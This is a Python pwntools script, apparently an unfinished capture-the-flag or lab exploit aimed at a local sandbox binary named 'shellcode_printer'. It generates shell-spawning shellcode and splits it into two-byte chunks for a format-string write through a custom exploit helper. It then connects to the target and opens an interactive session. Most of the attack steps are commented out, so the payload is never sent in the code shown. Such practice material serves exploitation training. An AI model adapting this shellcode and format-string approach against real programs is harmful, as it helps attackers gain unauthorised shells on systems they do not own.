from pwn import *
from time import sleep
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))
from tools.string_bug import FormatStringExploit
from dispatcher import Dispatcher

dispatcher = Dispatcher({
    'mode': 'binary',
    'binary': 'target/sandbox/shellcode_printer',
    'type_binary': 'i',
    'type_input': 'stdin',
    'verbose': False
})
exploit = FormatStringExploit(dispatcher, verbose=False)

shellcode = asm(shellcraft.sh())
chunks = [u16(shellcode[i:i+2].ljust(2, b'\x00')) for i in range(0, len(shellcode), 2)]

dispatcher.connect()
dispatcher.client.receive_response()

# bruteforce offset (possible emplacement de local_40 sur la stack)
# for offset in range(1000,2000):
    # print(f"Trying offset: {offset}")
for i in range(1):
    try:
        # for j in range(i):
            # dispatcher.client.send_request(b"A")
            # dispatcher.client.receive_response()
        # dispatcher.client.send_request(b'\x41' * 15)
        dispatcher.client.receive_response()
        # dispatcher.client.send_request(b"")
        
        # print(dispatcher.client.get_address_segfault(b''))  
        # print(dispatcher.client.p.poll())
        dispatcher.client.interactive()
        # if dispatcher.client.is_connected():
            # print("Exploit successful, shell opened.")
    except Exception as e:
            print(f"Error occurred: {e}")
            dispatcher.client.close()
            # sleep(1)
            dispatcher.connect()
            dispatcher.client.receive_response()
